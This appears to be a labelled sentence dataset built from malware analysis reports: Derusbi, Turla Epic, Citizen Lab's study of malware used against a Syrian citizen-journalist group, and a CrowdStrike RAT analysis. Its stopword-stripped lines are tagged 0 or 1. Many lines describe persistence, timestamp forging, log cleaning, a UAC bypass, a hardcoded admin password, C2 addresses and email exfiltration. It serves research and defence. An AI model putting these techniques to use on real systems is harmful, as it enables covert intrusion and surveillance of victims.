PCC_FILE::ProcessPacketEx performs file management operations instead adds incoming command packets queue processing PCC_FILE::ReadWaitingData packet already within queue ( thus avoiding duplication commands )	0
The PCC_FILE::ReadWaitingData member function stub function calls PCC_FILE::ProcessQueue returns resulting packet queue processing	0
This means file operations surprisingly low priority potentially high latency operations	0
Each packet arrives within packet queue PCC_FILE contains standard header followed ( quasi - optional ) payload data blob	0
The header PCC_FILE command packets takes following form	0
The dwCommandType field specifies specific PCC_FILE command client requesting server variant perform	0
PCC_FILE supports 17 ( 15 unique ) commands	0
While general form within Derusbi server variant communication model return packet dwCommandType original command many PCC_FILE commands return status packet type ( dwCommandType = 0x04 )	0
Commands 0x2C 0x44 0x48 appear exact base command slight variations response format	0
It unclear particular command included three times PCC_FILE	0
The PCC_PROXY object provides platform tunneling network traffic client specific endpoint ( endpoints multiple tunnels activated client )	0
Derived PCC_BASEMOD class PCC_PROXY class performs little network tunneling within CommLoop interactive PCC_PROXY::ProcessPacket PCC_PROXY::ReadWaitingData member functions	0
The PCC_PROXY::ProcessPacket member function queues incoming PCC_PROXY packets received queue PCC_PROXY::ReadWaitingData returns packets transmit queue directionality perspective server variant	0
The core PCC_PROXY 's network tunneling comes spawned processing thread ( PCC_PROXY::MainThread ) generated PCC_PROXY object instantiated	0
The PCC_PROXY::MainThread function consist infinite loop terminates PCC_PROXY::fShutdown flag set	0
Otherwise loop inspect another internal flag ( PCC_PROXY::fNetworkEnabled ) determine network tunneling currently active	0
If PCC_PROXY::fNetworkEnabled flag set false tunneling disabled command processing continues	0
It possible one tunnel active given time	0
In order firewall tunnels backbone server variant 's command channel tunnel assigned specific channel identifier	0
This allows client specify specific tunnel data transmitted well telling client tunnel returning data	0
If PCC_PROXY::fNetworkEnabled flag set true PRC_PROXY::MainThread loop active channels perform select socket connected endpoint -- select indicates data waiting particular socket -- data read	0
A new PCC_PROXY based packet generated packet queued delivery client	0
After processing channels new data PCC_PROXY::MainThread processes incoming command packets client ( operation usually handled PCC_BASEMOD::ProcessPacket function )	0
Packets belonging PCC_PROXY subsystem common header much like PCC_BASEMOD derived classes	0
To end PCC_PROXY packets packet header PCCFilePacketHeader packet header	0
The PCC_PROXY supports five commands	0
The administrative commands built - server variant derived PCC_BASEMOD class	0
Each administrative command packets contains header structure PCCFilePacketHeader structure followed optional payload data blob	0
The administrative commands consist following five commands	0
Given encrypted potentially compressed nature Derusbi server variant network traffic detecting traffic network problematic using traditional IDS signatures	0
Using heuristic approach would possible detect handshake possible Derusbi server variant session looking following pattern	0
Detecting Derusbi server variants disk possible using following YARA signature	0
File name varies MD5 a3cbf6179d437909eb532b7319b3dafe Compilation timestamp 2012.10.02 10:51:50 ( GMT ) Compiler Microsoft Visual Studio 2010 File format PE32 DLL Exports _ LowLevelKeyboardProc@12 Creates log file % TEMP%\~DFD3O8.tmp	1
If failed tries write file f:\keyhook.log Each time keylogger starts appends following header log file	0
-------------------------------------------------------------------------------- New Session % fully qualified computer name% % timestamp% -------------------------------------------------------------------------------- It creates hidden console window registers export _ LowLevelKeyboardProc@12 hook procedure low - level keyboard input events ( WH_KEYBOARD_LL hook )	1
Depending results writes line log file	0
In case hook installed line " Started ... " else " LoadLibrary ' % path file% ' failed % error code% "	0
It also starts thread retrieves current foreground window handle every 100 milliseconds	0
This handle used keyboard hook procedure	0
The low - level keyboard hook procedure intercepts WM_KEYDOWN WM_KEYUP WM _ SYSKEYDOWN system messages writes information keystroke log file	1
Every time new window becomes active retrieves name path application writes information log file	0
[ % path application 's executable file% " % window title% " ] Analyzed file ( others similar )	0
Compilation timestamp 2013.10.15 10:43:09 ( GMT ) File format PE32 DLL modified ( file supposed started custom loader ) Exports	0
The main functionality implemented single function called DllMain entry point	0
The exported functions allow call function directly ( exported " start " ) start / stop separate thread ( " ModuleStart"/"ModuleStop " ) slightly different parameters	0
This indicates backdoor also function plugin Turla Carbon system	0
The main function executes infinite loop	0
It collects available information system transmits C&C server executes commands receives back	1
The module delays execution random periods discovers running processes one following filenames	0
The following system information collected	0
The retrieved information compressed using bzip2 encrypted AES encoded using Base64 transmitted C&C server	1
When file waiting upload ( usually file contains results previously received executed command ) read disk uploaded server instead system information	1
The C&C communication implemented top standard HTTP / HTTPS protocols	0
The list C&C URLs hardcoded binary may overridden commands	0
The module uses Wininet API functions issuing HTTP POST requests server	1
The module transmits collected information body POST request gets new commands server 's response	1
The request body empty new information upload	0
The response usually HTML document commands Base64-encoded strings enclosed div>/</div tags	0
Every command encrypted using asymmetric encryption temporary AES session keys	0
Each command mixed text / binary buffer	0
It consists two parts payload configuration	0
The configuration INI file controls behavior module	1
It extracted temporary file named % TEMP%\~D%random%.tmp	0
The payload exists supposed executable file may executed corresponding command present INI part	0
The format decoded command following	0
Format C&C command buffer Available commands	0
Lateral movement tools	0
Epic / Tavdig backdoors	0
Dropper packages installs Epic Turla Carbon system	0
PDF exploits used spearphishing attacks drops Epic backdoor	0
SCR / EXE files - used spearphishing / social engineering	0
Fake " Adobe Flash Player " Epic backdoor installers	0
Fake " Microsoft Security Essentials Quick Scan " Epic backdoor installer Turla Carbon Pfinet backdoors Turla Carbon package Related Turla sample module Java Exploits used waterhole attacks	0
John Scott-Railton Seth Hardy With collaboration Cyber Arabs	0
Media coverage Associated Press Forbes This report describes malware attack circumstantial links Islamic State Iraq Syria	0
In interest highlighting developing threat post analyzes attack provides list Indicators Compromise	0
A Syrian citizen media group critical Islamic State Iraq Syria ( ISIS ) recently targeted customized digital attack designed unmask location	0
The Syrian group Raqqah Slaughtered Silently ( RSS ) focuses advocacy documenting human rights abuses ISIS elements occupying city Ar- Raqah	0
In response ISIS forces city reportedly targeted group house raids kidnappings alleged assassination	0
The group also faces online threats ISIS supporters including taunts ISIS spying group	0
Though unable conclusively attribute attack ISIS supporters link ISIS plausible	0
The malware used attack differs substantially campaigns linked Syrian regime attack focused group active target ISIS forces	0
As Syrian Civil War continues Syrian citizen journalists nonviolent activists operate increasingly unsafe environment	0
The regime never welcomed work often targeted arrest detention multi-year hacking campaign ( see Pro-Regime / Regime Linked Groups )	0
Additionally elements Syrian opposition uniformly supported nonviolent activists citizen journalists	0
More recently areas like Raqqah nonviolent activists face new exceptionally grave threat ISIS	0
A growing number reports suggest ISIS systematically targeting groups document atrocities communicate Western media aid organizations sometimes pretext finding '' spies ''	0
Ar-Raqqah city case study located situated northern Syria continues key conflict flashpoint Syrian Civil War	0
In spring 2013 Islamists Free Syrian Army ( FSA ) fighters took Ar- Raqqah regime forces	0
As ISIS gained momentum consolidated control city edging FSA- affiliated groups attacks summary executions kidnappings range groups including ethnic religious minorities	0
During 2014 number reports-many unconfirmed-that ISIS confiscated smartphones laptops captured activists	0
According Syrians experienced searches spoke one reports ' authors ISIS sometimes extracts data confiscated smartphones laptops collect information people groups targeting well seek evidence '' un-Islamic '' activities	0
As ISIS cements control Ar-Raqqah territories reports emerged recently ( though confirmed ) suggesting elements within ISIS growing increasingly sophisticated imposing control targeting opponents using digital methods	0
Reports ISIS targeting Internet cafés grown increasingly common cases reports point possible use keyloggers well unspecified '' IP sniffers '' track behaviour Internet cafes	0
Nonviolent activists citizen journalists based Ar-Raqqah provided outside world much know ISIS treats population	0
These activists journalists face mortal danger actions reports emerged detention torture hands ISIS	0
As ISIS continues use social media push message welcomed population Ar-Raqqah groups like Raqqah Slaughtered Silently ( RSS ) provide compelling counter narrative	0
RSS n't escaped ISIS ' notice group targeted kidnappings house raids least one alleged targeted killing	0
At time writing ISIS allegedly holding several citizen journalists Ar-Raqqah	0
In addition RSS targeted online ISIS supporters harassment including threats physical safety members	0
For example ISIS supporters claimed ISIS established system CCTV cameras Ar-Raqqah observe residents ' movements	0
While claim may bluff exaggeration least one ISIS supporter indicated social media system could used look members RSS	0
This section describes highly targeted attack sent e-mail address belonging RSS	1
The Citizen Lab analyzed attack consent RSS requested name used report	0
The attack took form unsolicited e-mail containing download link decoy file	1
The file contained custom malware profiled victim 's computer beaconed IP address e-mail account attacker 's control	1
The unsolicited message sent RSS end November 2014 Gmail email address	1
The message carefully worded contained references specific work interests RSS	0
Thank efforts deliver true picture reality life Raqqah	0
As Syrians residing Canada working media believe importance shedding light realities life Syria Raqqah particular	0
We preparing lengthy news report realities life Raqqah	0
We sharing information hope correct case contains errors	0
We prepared map city Raqqah addition preliminary report	0
We hope look inform us errors	0
We also hope happen Facebook could provide us account person responsible campaign n't mind communicate directly	0
You see preliminary copy report linkhttp //tempsend [ DOT ] com/ [ Redacted ] With respect [ Name Redacted ] We unsure attacker specifically mentions Canada email lure	0
However well known Syria's extensive diaspora ( including Canada ) regularly engages advocacy sometimes coordination groups within Syria	0
Thus message face implausible	0
However note attacker also attempts social engineer identity individuals working RSS requesting personal Facebook page	1
The custom malware used attack infects user views decoy '' slideshow '' beacons home IP address victim 's computer details system time computer restarts	1
Unlike Syrian regime-linked malware contains Remote Access Trojan ( RAT ) functionality suggesting intended identifying locating target	1
Further malware sends data captured malware e-mail address require attackers maintain command-and-control server online	1
This functionality would especially useful adversary unsure whether maintain uninterrupted Internet connectivity	0
Accessing link provided malicious e-mail sends user .zip	0
file hosted file-sharing site tempsend.com	0
At time writing file downloaded 10 times This file self-extracting archive icon intended suggest victim slideshow	0
When run file opens slideshow Google Earth screen captures victim displaying series locations Syria highlighting '' ISIS HQ '' images showing alleged locations US airstrikes	0
Examples images slideshow follows When opened '' slideshow.zip '' file writes executes several files '' AdobeR1.exe '' malicious '' pictures.exe '' genuine slideshow displayed victim	1
When slideshow closed AdobeR1.exe pictures.exe deleted	1
The AdobeR1 file writes series executable files perform information collection communication functions including The program sequence data collection sending somewhat unusual program performing single task communicating via markers left registry	1
Programs appear make use Visual C++ Runtime Library	0
First program nvidrv adds autorun It also creates series registry keys individual programs use communicate Registry keys programs using It runs GooglUpd cleans program files exist runs AdbrRader	1
AdbrRader ( communicating registry key '' 2 '' ) writes file vgadmysadm.tmp name another registry key '' 2 '' startup info	1
Next nvidrv runs GoogleUpate collects system information writes Then nvidrv runs nvisdvr ( registry key '' 4 '' ) collects list running processes written Finally nvidrv runs svhosts tests Internet connectivity DNS query windowsupdate.microsoft.com	1
It runs rundl132 checking whether registry key name '' 6 '' present	1
It sets key '' 0 '' runs	1
Next '' rundl132.exe '' performs HTTP GET request myexternalip.com collects external IP infected machine Next rundl132 writes Then rundl132 writes external IP Finally rundl132 runs AdobeIns zips contents win32.tmp folder	1
Program '' AdobeIns.exe '' takes files written programs zips encrypted password- protected file Data transmitted e-mail account presumably controlled attacker	1
AdobeIns connects account online e-mail provider inbox.com via smtp using hardcoded credentials	1
The malware sends e-mail inbox containing text '' Hello '' mxtd file attached	1
SMTP traffic generated malware inbox.com ( redactions ) The malware seen case study unusual relies half-dozen separate executable files single task communicating via markers dropped Registry	1
The malware also interesting provide remote access sends e-mail containing victim 's IP address miscellaneous system information	1
The malware resends information time computer restarted refresh sent information restart ( may bug )	1
This behaviour strongly suggests function malware serve beacon	1
The system information could used identify processes exploit future however since attacker already triggered execution file victim 's system surprising taken RAT ( custom widely available ) used	1
A RAT would provided much greater access alongside IP information By providing remote access RAT functionality program looks less like malware may attract less attention endpoint protection tools scanners	1
Detections low file first submitted VirusTotal example	0
It registered 6/55 detections anti virus scanners 10 % detection rate	1
Transmitting malware via e-mail also provides degree obscurity additional advantage providing layer abstraction attacker target need maintain RAT command-and-control server	1
The malware transmits autonomously leaving material inbox attacker collect later time	1
The malware obfuscation processes highly technical development interaction Windows	0
Nevertheless believe author program aware certain techniques reduce visibility malware network including transmitting data via encrypted e-mail communications	1
However attacker correctly implemented encrypted e-mail malware attempt use TLS connection certain cases	0
As result account login credentials may readily available network traffic	0
In addition malware uses old PKWARE implementation zip encryption particularly secure	1
The password zipped file also present binary without encryption obfuscation	0
Citizen Lab researchers developed Targeted Threat Index ( TTI ) tool standardize information sophistication targeted threats civil society groups research	0
The index captures information level social engineering used ( '' Targeting Sophistication '' ) adds Technical Sophistication value attack multiplier	0
This attack little technical sophistication ( i.e. uses exploits code obfuscation techniques frustrate reversing etc	1
) nevertheless carefully developed social engineering seeding materials bait document	1
Taken together rates 3 Targeting Sophistication 1.25 Technical Sophistication metric yielding TTI score 3.75	0
Citizen Lab research using TTI found despite low levels technical sophistication well-crafted social engineering malware attacks remain highly effective civil society groups	0
More information available TTI recent Usenix Security paper	0
There least three possible sources malware attack We evaluate possibilities turn drawing information available us almost three years tracking regime-linked malware	0
Pro-regime malware actors continually targeted Syrian opposition waves malware since least late 2011	0
Those campaigns extensively reported range groups including Kaspersky FireEye Citizen Lab Electronic Frontier Foundation many others	0
Regime-linked malware number common features typically serve distinguishing characteristics Social engineering focusing needs interests opposition	0
Although targeted malware seeding often aims classes people ( e.g. people interested 'shocking ' news fighter 'leaked ' information Assad regime ) rather carefully written spear phishing targeting single individual small group	1
Use widely available RATs ( njRAT Xtreme Rat ShadowTech Rat DarkComet RAT Blackshades RAT among others )	1
At least one command-and-control server located within Syrian IP space ( often limited range addresses )	1
Frequent use Dynamic DNS providers like no-ip	0
Use '' crypters '' obscure binary	1
These characteristics present every sample typically found one almost every binary examined Syrian regime-linked	0
This malware attack differs known regime-linked groups elements	0
Not exceptionally targeted also commonly available RAT	1
Nor RAT functionality	0
The function malware appears identify unmask IP address target ( ) resend attacker reboot	1
In addition data sent Internet e-mail address crypter used obscure binary	1
We aware one previous case Syria e-mail used transmit data believed regime linked	1
That incident observed 2012 also used hardcoded e-mail exfiltrate	1
However malware substantially functionality case drop second stage compromised site also included mechanism exfiltrating credentials Facebook hooking programs like Skype	1
The lack overlap Tactics Techniques Procedures ( TTPs ) attack prior attacks rule Syrian regime-linked attackers	0
It possible regime-linked groups trying new approach	0
However given known regime-linked groups continued remain active date range using familiar TTPs scenario seems unlikely	0
In addition would strange regime-linked malware groups undertake significant effort prepare send implant significantly less functionality commonly use	0
Taken together find evidence supports hypothesis familiar regime-linked groups conduct attack	0
RSS operates territory controlled ISIS faced extensive targeting ISIS	0
Currently appear directly targeted ISIS kidnappings retaliation including executions	0
In addition ISIS supporters explicitly suggested group surveillance actively hunted	0
Together evidence suggests ISIS strong motivation using social engineering and/or malware locate members RSS	0
We think several features malware attack align needs constraints ISIS supporters Ar-Raqqah groups understand	0
For example The malware beacons location provide RAT functionality	1
The seeding attempts obtain 'private ' Facebook identity RSS social engineering	1
The malware exfiltrates online e-mail account thus requiring attacker maintain command-and- control server online	1
The social media activity members RSS often highly public	0
Their location exact membership however secret	0
We speculate attacker interested maintaining long-term surveillance activities RSS could employed RAT	0
However attacker interested unmasking location targets could physically tracked collecting IP data system info would reasonable approach	0
ISIS supporters clearly strong interest ( rudimentary ) location tracking members RSS malware provides	0
Internet connectivity Raqqah extremely limited ISIS control	0
Knowing IP address target could quickly narrow targets specific locations specific Internet services Internet cafes Raqqah	0
Given identities locations RSS members closely guarded information would hold significant intelligence value ISIS	0
Armed kind information ISIS could physically harm people within Raqqah ( also possible ability operate capacity border areas Turkey )	0
Little publicly known technical capabilities ISIS supporters ; however reports begun emerge suggesting ISIS interested expanding abilities	0
In addition ISIS reportedly gained support least one individual experience social engineering hacking Junaid Hussain ( aka TriCk ) former member teamp0ison hacking team	0
While Mr. Hussain associates reportedly made threats Western governments possible others working ISIS quietly supported effort identify targeted organization highly visible thorn side ISIS	0
It possible attack product actors working unknown purposes targeting RSS	0
Given activities RSS however unclear might	0
It possible example reject theory unknown group within FSA groups opposing Assad regime responsible	0
Citizen journalists Ar-Raqqah previously critical arbitrary arrests carried non-ISIS groups 2013	0
However unclear groups longer control Ar-Raqqah would interested RSS November 2014	0
It likely third party actors including several intelligence services closely monitoring various actors conflict range electronic means	0
However little reason suggest would use tailored technically rudimentary attack target RSS particular	0
After considering possibility find strong inconclusive circumstantial evidence support link ISIS	0
However unable connect attack directly ISIS Mr. Hussain ISIS supporters	0
If indeed ISIS supporters responsible seems reasonable offensive capability may still development	0
We hope publishing report draw attention new concerning threat includes ISIS critics among targets	0
If ISIS responsible attack targets in-country impediments ISIS objectives targets may include ideological military adversaries abroad	0
Whether ISIS responsible attack likely work non-regime threat actor may beginning field still-rudimentary capability Syrian conflict	0
The entry costs engaging malware attacks conflict like Syrian Civil War low made lower fact rule law nonexistent large parts country	0
In still parts ( regime control ) malware attacks appear state sanctioned	0
Citizen Lab research targeted digital threats civil society confirms civil society groups face grave threats targeted malware attacks despite under-resourced defend	0
The case highlighted exception lack IT security resources made difficult Syrian opposition address targeted persistent digital threats	0
In addition ISIS indeed responsible case suggests easy belligerents conflict begin fielding basic offensive digital capabilities quickly capabilities pointed unarmed civil society groups	0
This attack exceptionally targeted clearly reflected work actor familiar operations targeted organization	1
As organizations working issues surrounding Syria aware malware delivered good social engineering constant source danger	0
This particular attack prevented opening files sent unknown persons	0
However many attacks Syria come hijacked accounts impersonate people known targets	0
Social engineering remains unsolved problem continues compromise groups throughout Syrian opposition supporters	0
This attack reaffirms dangers posed social engineering attacks whether deliver phishing campaigns malware	0
The circumstantial evidence ISIS involvement suggests groups working topics ISIS considers threat partner organizations supporters urgently examine security policies assess possible risks operations consequences exposure sensitive information ISIS	0
Even link ISIS turns incorrect possible threat future	0
Individuals groups risk also consult materials Arabic provided Cyber Arabs including series accessible videos digital security	0
The malware files Files dropped malware Collected Information Files ( unencrypted ) Exfiltrated file ( encrypted ) Registry Keys Acknowledgements We grateful Cyber Arabs Institute War Peace Reporting critical work assistance	0
Special thanks several anonymous Syrians Masashi Crete-Nishihata Sarah McKune Morgan Marquis-Boire Ron Deibert Bill Marczak Nart Villeneuve Irene Poetranto Kristen Dennesen	0
Support research provided grants John D. Catherine T. MacArthur Foundation Ford Foundation	0
In late December 2011 CrowdStrike Inc. received three binary executable files suspected involved sophisticted attack large Fortune 500 company	0
The files analyzed understand first fact malicious level sophistication samples	0
The samples clearly malicious varied sophistication	0
All three samples provided remote access attacker via two Command Control ( C2 ) servers	1
One sample typical commonly referred 'dropper ' primary purpose write malicious component disk connect targeted hosts operating system	1
The malicious component case commonly referred Remote Access Tool ( RAT ) RAT manifested Dynamic Link Library ( DLL ) installed service	1
The second sample analyzed dual use tool function post exploitation tool used infect systems download additional tools remove log data used backdoor	1
The third sample sophisticated implant addition multiple communication capabilities ability act relay infected hosts utilized kernel mode driver hide aspects tool user-mode tools	1
This third component likely used long-term implantation intelligence gathering	1
Some AV engines occasionally identify sample Derusbi Trojan	0
CrowdStrike Intelligence Team seen Trojans 8 different builder variants RAT including 64-bit versions used targeted attacks 2011 Defense Energy/Power Chemical Industries US Japan	0
All samples reflect common toolmarks tradecraft consistent Chinese based actors target various strategic interests United States including High Tech/Heavy Industry Non-Governmental Organizations ( NGOs ) State/Federal Government Defense Industrial Base ( DIB ) organizations vast economic interests	0
This report contains in-depth technical analysis samples detection/remediation/mitigation information attribution intelligence conclusion aimed providing reader synopsis report	0
The executable 14c04f88dc97aef3e9b516ef208a2bf5 commonly referred 'dropper ' designed purpose extracting malicious payload initialize install targeted system	1
In case malicious payload Dynamic-Link Library ( DLL ) enables attacker full control system	1
This code appears compiled Wednesday May 4th 2011 11:04:24 A.M. UTC ( equivalent early evening time China )	0
Note timestamp UTC however relative time day China provided benefit reader	0
The sample first resolves several library functions provided Microsoft using LoadLibrary ( ) GetProcAddress ( ) Application Programming Interfaces ( APIs )	1
The imported function names encrypted ; however function name minutely obfuscated simple single character substitution The dropper invokes SHGetSpecialFolderPath ( ) API supplying Constant Special Item ID List ( CSIDL ) 'CSIDLCOMMONDOCUMENTS ' identify destination folder malicious DLL payload	1
The CSIDL case pints '' The file system directory contains documents common users	0
A typical path C \Documents Settings\All Users\Documents	0
'' The dropper attempts write malicious payload one following names using first available name set The dropper sets creation last written timestamp newly created file date 2007-03-07 00:00:00 ; allows newly created malicious DLL blend system files	1
This meant prevent identification disk forensics using common investigative technique called forensic analysis timeline	1
This date specified dropper code change across multiple infections	0
The malicious DLL file dropped hidden resource dropper binary	1
This relatively common technique used malware dropper files optimize number files required infect machine	0
The resource language malicious DLL set '' Chinese ( Simplified ) '' compiler artifact indicates language setting compiler used person built binary set '' Chinese ( Simplified ) '' time dropper compiled	0
The 'MZ ' header denotes binary executable file dropped DLL initially obfuscated	0
When dropper writes file disk first byte file 'Z ' prevents file executing detected executable many defensive tools	1
The dropper subsequently opens dropped file corrects header writing 'M ' first byte allowing file executed	1
A subroutine decompress dropped file present 'dead code ' ( code used ) binary	0
This subroutine invoked already closed file handle dropped file present code version	0
Since dropped resource compressed routine fails	0
This indicates low sophistication modification original dropper code make work uncompressed source	0
The final step dropper performs load dropped DLL process space ; resolves export 'OpenINFOPerformanceData ' DLL invokes dropped DLL 's filename parameter	1
This export implements actual install logic maintain persistence invoke main routine	1
The dropper binary contains icon resource resembles 'Google Chrome ' browser icon re- source language set '' Chinese ( Simplified ) '' consistent builder tool systems language set Chinese	0
The use Chrome icon may indicate possible attempt socially engineer intended victim thinking dropper legitimate file associated Google	1
This sample 'backdoor ' DLL dropped dropper sample file MD5 14c04f88dc97aef3e9b516ef208a2bf5	1
This code appears compiled Wednesday May 4th 2011 10:48:19 A.M. UTC ( equivalent early evening time China )	0
It instantiated mapped process space dropped file ' export named 'OpenINFOPerformanceData ' called	1
This export first attempts stop service called '' msupdate '' known Microsoft Windows service despite appearance	0
If service present malware replaces previous instances versions backdoor	1
After attempting disable existing service malware tries install service name	1
During installation sample attempts use documented APIs OpenSCManager ( ) CreateService ( ) initialize persistent Windows service	1
As precaution sample writes settings directly Windows Registry accomplish goal installing service documented APIs fails	1
The registry change creates following key Following subroutine set value 'ServiceDLL ' module handle DLL	1
The next key changed HKEYLOCALMACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost 'msupdate ' key set 'msupdate '	1
The export 'CollectW3PerfData ' registered main function DLL	1
If installation new service successful sample starts new service exits	1
If installation fails sample spawns new process using rundll32.exe executable instantiate DLL call specific exported function	1
In case installation failure rundll32.exe calls main functions export 'CollectW3PerfData '	0
The rundll32.exe instantiated new NULL Security Identifier ( SID ) ( S-1-0-0 ) permissions set grant access file	1
This allows user complete control machine rundll32.exe frequently launched tasks changing time wallpaper system settings	1
This means cleaning components dropped malware system remains vulnerable local attacks simply overwriting legitimate rundll32.exe executable malicious version await 's automatic execution Operating System	1
The main entry point DLL named 'CollectW3PerfData ' first creates displays fake Window class '' NOD32 % '' % replaced pseudo-random number	0
This may attempt fool automated dynamic analysis anti-malware software believing legitimate ESET AV software	1
The window however visible implements specific functionality	0
After creating window routine starts main thread eventually initiates calling Command Control ( C2 )	1
In order accomplish task newly created thread initializes networking APIs using WSAStartup ( ) resolves APIs dynamically using LoadLibrary ( ) GetProcAddress ( )	0
Once proper API 's resolved sample assigns NULL SID rundll32.exe executable sets current process ' Window Station '' winsta0 '' enables sample access real user 's desktop started service	1
The communication C2 handled ( ) loop successive connection attempt causing loop invoke Windows Sleep ( ) API time interval 2 seconds exponentially increasing length 1024 seconds ( 17 minutes ) restarting back 2 seconds	1
The C2 location sample statically defined 1.9.5.38:443 ( Malaysia Tmnet Telekom Malaysia Bhd )	0
While ther 'dead code ' download C2 location HTTP URL could defined binary using User-Agent string '' Google '' code activated due format stat- ically defined C2 location using IP address	0
Thus sample attempt connect directly using raw socket C2 located 1.9.5.38:443	1
This indicates use 'boiler plate code ' builder software package automates creation malicious sample	0
The malicious sample sends initial beacon C2 includes following information The beacon encrypted using XOR/ADD loop using statically defined key 0x1C sent C2	1
The following python function used decode beacon stings After sending initial beacon routine loops receiving incoming commands executes sequence	1
When connection successfully established C2 server sleep timer reset two seconds next attempt	0
The network protocol used sample resembles 'Type-Length-Value ' layout directions	0
Each 16 byte request header consists Zero specified bytes additional payload follows header	0
This inbound payload received unconditionally regardless command type fixed-size stack buffer 408 bytes size	1
Providing additional payload larger size result trivial exploitable stack buffer overflow allows arbitrary code execution due absence security features	0
However exploitation vulnerability unnecessary due already available unauthenticated command execution capabilities backdoor	0
Certain commands initiate second connection C2 separate thread using network protocol providing different request command identifier initial beacon	0
The primary aim backdoor remote desktop control functionality comparable VNC Remote Desktop custom protocol	1
It allows adversary view main desktop graphically control keyboard mouse	1
This remote control functionality implemented separate messages mouse clicks pressed keys etc	1
using command identifiers 0x20000002 0x20000019	1
The command 0x22000001 initiates continuous transmission screen captures C2	1
The screen captures created using series Microsoft Windows Graphic Device Interface ( GDI ) API calls culminating call GetDIBits ( )	1
Command 0x20000001 exits backdoor 0x20000000 issued completely remove backdoor system	1
When command 0x23000004 received temporary new user '' DomainUser '' password '' Dom4 nU- serP4ss '' created added local Administrators group	1
The backdoor started account user deleted	1
It would appear technique meant obfuscate activities malicious sample masking process creator 's user name appear generic domain user	1
Note account normally exist Active Directory environment	0
Additionally primary C2 connection allows requests start additional connections C2 imple- menting following functionality This sample typical post exploitation tool ; written .NET	0
2.0	0
This code appears compiled Thursday May 26th 2011 10:21:44 A.M. UTC ( early evening time China )	0
The backdoor functionality instantiated either directly command line commands issued network based protocol via C2	1
If arguments given connection C2 initiated stati- cally defined IP address	1
The command line options support post exploitation capabilities changing file timestamps forensic mitigation privilege escalation launching executable specifying specific C2	1
One interesting command line option allows backdoor filter contents specified files remove content using regular expression ( regex )	1
This command modifies creation modification last access timestamps modified file conceal content modifications	1
A detailed listing command line arguments viewed Appendix A	0
This activity generally associated log cleaning com- plicate forensic investigation	1
The sample contains embedded IP address C2 stored encrypted format string re- source The first two bytes string represent base 16 length encrypted string case '' 0x14 ''	0
Following base64 encoded string specified length	0
Once string decoded using base64 result XOR 'd fixed value 0xAA yielding decoded IP address 202.86.190.3:80 ( Hong Kong TeleOne ( HK ) Limited )	0
There three components protocol Authentication accomplished using 32 byte packet packet consists An example authentication packet sent C2 located Appendix E. After sending initial authentication packet sample verifies first four bytes response equal statically defined value sample value 0x16030100	1
In addition 8 byte key sent client RC4 encrypted using random number generated step 2 password	1
This value transformed using simple algorithm Appendix F 32 byte array	0
The first 16 bytes array used KEY second 16 bytes used IV setting AES encryption used encrypt decrypt communications	1
Beacon typical type malicious sample allows operator separate various infected hosts targeted campaign	0
The beacon sample formatted XML consists An example unencrypted beacon Command handling loop loop structure process execute commands sent C2	1
The malware sends receives heartbeat/keepalive packet every 2 minutes	1
The command format derived structure consisting These fields received sequence serialized .NET	0
objects order specified	0
A detailed description possible values commands Appendix D. It important note order application defines order appear coming network	0
Examples implemented commands include download upload files installing new .NET assemblies calling methods assemblies connecting new C2 servers executing processes	1
This sample sophisticated backdoor implements several communications protocols developed C++	1
This binary compiled /GS flag using Visual Studio 2010 enabling stack buffer overflow detection	0
This code appears compiled Sunday October 30 2011 12:43:33 P.M. UTC ( late evening time China )	0
The code contains several Run Time Type Information ( RTTI ) artifacts indicate C++ class names prefixed string '' PCC '' original source code	0
Variants Trojan sometimes detected name 'Derusbi ' Microsoft Trend Sophos Symantec AV engines	0
This sample DLL registered service used drop kernel driver provide interactive command line shell C2	1
It also able bypass User Account Control ( UAC ) install using 'sysprep.exe ' Microsoft Windows executable provided targeted system	1
The steps takes install onto system follows 2	0
After copies modify creation time last access time last modification time current system time copy made year changed 2005	1
3	0
Adds service name backdoor 's configuration HKEYLOCAL MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ service '' This defaults '' wuauserv '' legitimate Windows Update service given binary 's default configuration	1
4	0
Adds list services started 'netsvc ' using service name 'helpsvc '	1
5	0
If McAfee AV installed creates copy regsvr32.exe named Update.exe schedules copy deleted reboot using well documented MoveFileExA API	1
6	0
It calls either original copy regsvr32.exe parameters /s /u path copy made Step 1	0
The /u parameter means '' uninstall '' calls DllUnregisterServer unsophisticated method DLL entry point obfuscation	0
7	0
DllUnregisterServer installs driver initiates backdoor component	0
The sample capable 'dropping ' embedded/encrypted kernel driver	1
If process '' ZhuDongFangYu	0
